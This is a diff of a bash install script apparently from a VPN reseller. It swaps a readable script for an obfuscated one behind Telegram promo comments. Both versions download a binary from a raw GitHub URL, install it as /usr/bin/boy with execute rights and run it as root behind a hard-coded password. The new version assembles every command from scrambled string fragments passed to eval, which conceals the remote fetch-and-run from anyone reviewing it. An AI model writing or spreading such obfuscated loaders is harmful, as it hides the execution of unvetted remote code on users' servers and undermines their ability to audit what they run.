@@ -1,36 +1,8 @@
 #!/bin/bash
-#mahavpn
-#goodboy
-RED='\033[0;31m'
-NC='\033[0m'
-GREEN='\033[0;32m'
-ORANGE='\033[0;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-LIGHT='\033[0;37m'
-OWNER=mahavpn-mantap
-clear
-wget -P /root "https://raw.githubusercontent.com/GboyGud/clash_for_android/main/assets/hayo"
-chmod +x /root/hayo
-cp /root/hayo /usr/bin/boy
-chmod +x /usr/bin/boy
-rm /root/hayo
-clear
-read -p "Ketik (boy) untuk masuk ke monitor, masukkan password  : " RUN
-if [ $RUN = $OWNER ]; then
-clear
-echo -e "${green}Autentikasi SAH${NC}"
-rm /root/stat
-rm /root/monitor
-else
-clear
-echo -e "${red}Permintaan Ditolak, masukkan password yang benar!${NC}";
-echo "Harap hubungi admin MahaVPN"
-rm /usr/bin/boy
-rm /root/stat
-rm /root/monitor
-exit
-fi
-clear
-boy
+# Always Support MahaVPN
+# Join Channel - https://t.me/MahaVPN_Channel
+# Join Grup VIP Dengan Berlangganan VPN Premium, Link PM Telegram @AfthonPc
+
+z="
+";jCz='haVP';xBz='; th';Hz='GREE';nCz='boy';Fz='\033';qBz=': " ';OBz='root';mz='/roo';eBz='boy)';NCz='itor';MCz='/mon';cz='0;37';hz='ntap';az='LIGH';aCz='g be';kz='wget';Oz='[0;3';SBz='in/b';VCz='k, m';Uz=''\''';KBz=' /ro';ez='R=ma';cBz='"Ket';gz='n-ma';dCz=' "Ha';Rz='='\''\0';JCz='}"';jBz='moni';vz='.com';tBz=' $RU';oCz='exit';bBz=' -p ';UCz='tola';GCz='kasi';Nz='GE='\''';dz='OWNE';PCz='"${r';oBz='sswo';rz='ithu';XBz='y';WCz='kan ';UBz=' /us';gBz='uk m';BBz='or_a';YBz='rm /';aBz='read';Kz='0;32';Wz='LE='\''';Tz=';34m';vBz='$OWN';dBz='ik (';eCz='rap ';LCz='t';uz='tent';hBz='asuk';EBz='ain/';BCz=' -e ';Dz='31m'\''';iCz='n Ma';OCz='else';lCz='usr/';Lz='m'\''';hCz='admi';XCz='pass';Zz=';36m';wz='/Gbo';ECz='}Aut';ZCz=' yan';Ez='NC='\''';JBz='d +x';Bz=''\''\03';Sz='33[0';HCz=' SAH';CCz='"${g';fz='havp';Vz='PURP';uBz='N = ';Xz='5m'\''';oz='ttps';Az='RED=';nBz='n pa';HBz='ayo"';pz='://r';qz='aw.g';Mz='ORAN';Iz='N='\''\';kBz='tor,';RCz='ermi';MBz='ayo';ABz='sh_f';YCz='word';SCz='ntaa';bCz='nar!';Pz='3m'\''';IBz='chmo';Jz='033[';sz='buse';jz='r';Cz='3[0;';FBz='asse';lz=' -P ';pBz='rd  ';iz='clea';wBz='ER ]';lBz=' mas';yBz='en';fBz=' unt';QCz='ed}P';GBz='ts/h';yz='/cla';bz='T='\''\';xz='yGud';KCz='/sta';ACz='echo';TBz='oy';rBz='RUN';TCz='n Di';fCz='hubu';sBz='if [';tz='rcon';iBz=' ke ';pCz='fi';WBz='n/bo';DBz='id/m';LBz='ot/h';mBz='ukka';ZBz='o';DCz='reen';Yz='CYAN';mCz='bin/';nz='t "h';VBz='r/bi';Gz='[0m'\''';QBz='o /u';CBz='ndro';NBz='cp /';ICz='${NC';Qz='BLUE';PBz='/hay';RBz='sr/b';cCz='}";';kCz='N"';FCz='enti';gCz='ngi ';
+eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$Fz$Oz$Pz$z$Qz$Rz$Sz$Tz$Uz$z$Vz$Wz$Fz$Oz$Xz$z$Yz$Rz$Sz$Zz$Uz$z$az$bz$Jz$cz$Lz$z$dz$ez$fz$gz$hz$z$iz$jz$z$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$z$IBz$JBz$KBz$LBz$MBz$z$NBz$OBz$PBz$QBz$RBz$SBz$TBz$z$IBz$JBz$UBz$VBz$WBz$XBz$z$YBz$OBz$PBz$ZBz$z$iz$jz$z$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$z$sBz$tBz$uBz$vBz$wBz$xBz$yBz$z$iz$jz$z$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$z$YBz$OBz$KCz$LCz$z$YBz$OBz$MCz$NCz$z$OCz$z$iz$jz$z$ACz$BCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$hBz$WCz$XCz$YCz$ZCz$aCz$bCz$ICz$cCz$z$ACz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$kCz$z$YBz$lCz$mCz$nCz$z$YBz$OBz$KCz$LCz$z$YBz$OBz$MCz$NCz$z$oCz$z$pCz$z$iz$jz$z$nCz"
